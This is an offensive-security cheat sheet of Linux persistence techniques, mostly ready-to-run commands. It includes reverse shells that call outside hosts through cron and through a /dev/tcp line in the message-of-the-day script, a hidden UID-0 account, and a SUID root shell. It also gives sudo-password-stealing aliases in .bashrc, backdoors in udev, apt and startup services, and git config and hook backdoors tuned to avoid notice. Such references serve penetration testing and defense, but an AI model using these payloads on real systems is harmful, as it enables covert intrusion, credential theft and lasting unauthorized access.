# Linux - Persistence

## Summary

* [Basic reverse shell](#basic-reverse-shell)
* [Add a root user](#add-a-root-user)
* [Suid Binary](#suid-binary)
* [Crontab - Reverse shell](#crontab---reverse-shell)
* [Backdooring a user's bash_rc](#backdooring-a-users-bash_rc)
* [Backdooring a startup service](#backdooring-a-startup-service)
* [Backdooring a user startup file](#backdooring-a-user-startup-file)
* [Backdooring Message of the Day](#backdooring-message-of-the-day)
* [Backdooring a driver](#backdooring-a-driver)
* [Backdooring the APT](#backdooring-the-apt)
* [Backdooring the SSH](#backdooring-the-ssh)
* [Backdooring Git](#backdooring-git)
* [Additional Linux Persistence Options](#additional-persistence-options)
* [References](#references)


## Basic reverse shell

```bash
ncat --udp -lvp 4242
ncat --sctp -lvp 4242
ncat --tcp -lvp 4242
```

## Add a root user

```powershell
sudo useradd -ou 0 -g 0 john
sudo passwd john
echo "linuxpassword" | passwd --stdin john
```

## Suid Binary

```powershell
TMPDIR2="/var/tmp"
echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
rm $TMPDIR2/croissant.c
chown root:root $TMPDIR2/croissant
chmod 4777 $TMPDIR2/croissant
```

## Crontab - Reverse shell

```bash
(crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
```

## Backdooring a user's bash_rc 

(FR/EN Version)

```bash
TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
cat << EOF > /tmp/$TMPNAME2
  alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale  = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale  = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S '
EOF
if [ -f ~/.bashrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.bashrc
fi
if [ -f ~/.zshrc ]; then
    cat /tmp/$TMPNAME2 >> ~/.zshrc
fi
rm /tmp/$TMPNAME2
```

or add the following line inside its .bashrc file.

```powershell
$ chmod u+x ~/.hidden/fakesudo
$ echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
```

and create the `fakesudo` script.

```powershell
read -sp "[sudo] password for $USER: " sudopass
echo ""
sleep 2
echo "Sorry, try again."
echo $sudopass >> /tmp/pass.txt

/usr/bin/sudo $@
```


## Backdooring a startup service

* Edit `/etc/network/if-up.d/upstart` file
  ```bash
  RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
  sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
  ```


## Backdooring Message of the Day

* Edit `/etc/update-motd.d/00-header` file
  ```bash
  echo 'bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"' >> /etc/update-motd.d/00-header
  ```


## Backdooring a user startup file

Linux, write a file in  `~/.config/autostart/NAME_OF_FILE.desktop`

```powershell
In : ~/.config/autostart/*.desktop

[Desktop Entry]
Type=Application
Name=Welcome
Exec=/var/lib/gnome-welcome-tour
AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide
OnlyShowIn=GNOME;
X-GNOME-Autostart-enabled=false
```

## Backdooring a driver

```bash
echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
```

## Backdooring the APT

If you can create a file on the apt.conf.d directory with: `APT::Update::Pre-Invoke {"CMD"};`
Next time "apt-get update" is done, your CMD will be executed!

```bash
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```

## Backdooring the SSH

Add an ssh key into the `~/.ssh` folder.

1. `ssh-keygen`
2. write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys`
3. set the right permission, 700 for ~/.ssh and 600 for authorized_keys

## Backdooring Git

Backdooring git can be a useful way to obtain persistence without the need for root access.  
Special care must be taken to ensure that the backdoor commands create no output, otherwise the persistence is trivial to notice.

### Git Configs

There are multiple [git config variables](https://git-scm.com/docs/git-config) that execute arbitrary commands when certain actions are taken.  
As an added bonus, git configs can be specified multiple ways leading to additional backdoor opportunities.  
Configs can be set at the user level (`~/.gitconfig`), at the repository level (`path/to/repo/.git/config`), and sometimes via environment variables.

`core.editor` is executed whenever git needs to provide the user with an editor (e.g. `git rebase -i`, `git commit --amend`).  
The equivalent environment variable is `GIT_EDITOR`.

```properties
[core]
editor = nohup BACKDOOR >/dev/null 2>&1 & ${VISUAL:-${EDITOR:-emacs}}
```

`core.pager` is executed whenever git needs to potentially large amounts of data (e.g. `git diff`, `git log`, `git show`).  
The equivalent environment variable is `GIT_PAGER`.

```properties
[core]
pager = nohup BACKDOOR >/dev/null 2>&1 & ${PAGER:-less}
```

`core.sshCommand` is executed whenever git needs to interact with a remote *ssh* repository (e.g. `git fetch`, `git pull`, `git push`).  
The equivalent environment variable is `GIT_SSH` or `GIT_SSH_COMMAND`.

```properties
[core]
sshCommand = nohup BACKDOOR >/dev/null 2>&1 & ssh
[ssh]
variant = ssh
```

Note that `ssh.variant` (`GIT_SSH_VARIANT`) is technically optional, but without it git will run `sshCommand` _twice_ in rapid succession.  (The first run is to determine the SSH variant and the second to pass it the correct parameters.)

### Git Hooks

[Git hooks](https://git-scm.com/docs/githooks) are programs you can place in a hooks directory to trigger actions at certain points during git's execution.  
By default, hooks are stored in a repository's `.git/hooks` directory and are run when their name matches the current git action and the hook is marked as executable (i.e. `chmod +x`).  
Potentially useful hook scripts to backdoor:

- `pre-commit` is run just before `git commit` is executed.
- `pre-push` is run just before `git push` is executed.
- `post-checkout` is run just after `git checkout` is executed.
- `post-merge` is run after `git merge` or after `git pull` applies new changes.

In addition to spawning a backdoor, some of the above hooks can be used to sneak malicious changes into a repo without the user noticing.

Lastly, it is possible to globally backdoor _all_ of a user's git hooks by setting the `core.hooksPath` git config variable to a common directory in the user-level git config file (`~/.gitconfig`).  Note that this approach will break any existing repository-specific git hooks.


## Additional Persistence Options

* [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)
* [Compromise Client Software Binary](https://attack.mitre.org/techniques/T1554)
* [Create Account](https://attack.mitre.org/techniques/T1136/)
* [Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/)
* [Create or Modify System Process](https://attack.mitre.org/techniques/T1543/)
* [Create or Modify System Process: Systemd Service](https://attack.mitre.org/techniques/T1543/002/)
* [Event Triggered Execution: Trap](https://attack.mitre.org/techniques/T1546/005/) 
* [Event Triggered Execution](https://attack.mitre.org/techniques/T1546/)
* [Event Triggered Execution: .bash_profile and .bashrc](https://attack.mitre.org/techniques/T1546/004/)
* [External Remote Services](https://attack.mitre.org/techniques/T1133/)
* [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)
* [Hijack Execution Flow: LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)
* [Pre-OS Boot](https://attack.mitre.org/techniques/T1542/)
* [Pre-OS Boot: Bootkit](https://attack.mitre.org/techniques/T1542/003/)
* [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) 
* [Scheduled Task/Job: At (Linux)](https://attack.mitre.org/techniques/T1053/001/)
* [Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)
* [Server Software Component](https://attack.mitre.org/techniques/T1505/)
* [Server Software Component: SQL Stored Procedures](https://attack.mitre.org/techniques/T1505/001/)
* [Server Software Component: Transport Agent](https://attack.mitre.org/techniques/T1505/002/) 
* [Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) 
* [Traffic Signaling](https://attack.mitre.org/techniques/T1205/)
* [Traffic Signaling: Port Knocking](https://attack.mitre.org/techniques/T1205/001/)
* [Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001/) 
* [Valid Accounts: Domain Accounts 2](https://attack.mitre.org/techniques/T1078/002/)

## References

* [@RandoriSec - https://twitter.com/RandoriSec/status/1036622487990284289](https://twitter.com/RandoriSec/status/1036622487990284289)
* [https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/](https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/)
* [http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html](http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html)
* [http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/](http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/)
* [Pouki from JDI](#no_source_code)
